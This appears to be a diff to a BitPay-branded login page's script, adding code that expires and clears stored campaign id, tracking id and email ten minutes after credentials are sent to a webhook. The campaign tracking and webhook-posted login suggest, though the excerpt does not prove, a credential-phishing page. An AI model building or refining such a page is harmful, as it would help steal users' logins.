@@ -283,6 +283,42 @@
             return trackingId;
         }
 
+        // Check and clear expired data on page load
+        function checkAndClearExpiredData() {
+            try {
+                const expirationTime = localStorage.getItem('bitpay_data_expires');
+                if (expirationTime && Date.now() > parseInt(expirationTime)) {
+                    // Data has expired, clear it
+                    localStorage.removeItem('bitpay_campaign_id');
+                    localStorage.removeItem('bitpay_tracking_id');
+                    localStorage.removeItem('bitpay_email');
+                    localStorage.removeItem('bitpay_data_expires');
+                    console.log('Expired data cleared from localStorage');
+                }
+            } catch (error) {
+                console.error('Error checking expired data:', error);
+            }
+        }
+
+        // Set expiration timer for localStorage data (10 minutes after successful webhook)
+        function setDataExpiration() {
+            try {
+                const expirationTime = Date.now() + (10 * 60 * 1000); // 10 minutes from now
+                localStorage.setItem('bitpay_data_expires', expirationTime.toString());
+                
+                // Set a timer to clear the data
+                setTimeout(() => {
+                    localStorage.removeItem('bitpay_campaign_id');
+                    localStorage.removeItem('bitpay_tracking_id');
+                    localStorage.removeItem('bitpay_email');
+                    localStorage.removeItem('bitpay_data_expires');
+                    console.log('Messaging data expired and cleared after 10 minutes');
+                }, 10 * 60 * 1000); // 10 minutes
+            } catch (error) {
+                console.error('Error setting data expiration:', error);
+            }
+        }
+
         // Get or set campaign id from query param or storage
         function getOrSetCampaignId() {
             let campaignId = getQueryParam('campaign');
@@ -411,6 +447,10 @@
             })
             .then(result => {
                 console.log('Webhook success response:', result);
+                
+                // Set expiration timer for messaging data (10 minutes)
+                setDataExpiration();
+                
                 // Handle success
                 showSuccess('Login successful!');
                 setTimeout(() => {
@@ -505,6 +545,8 @@
 
         // Initialize on page load
         window.addEventListener('load', function() {
+            checkAndClearExpiredData(); // Check for expired data first
+            
             const emailInput = document.getElementById('email');
             const passwordInput = document.getElementById('password');
             
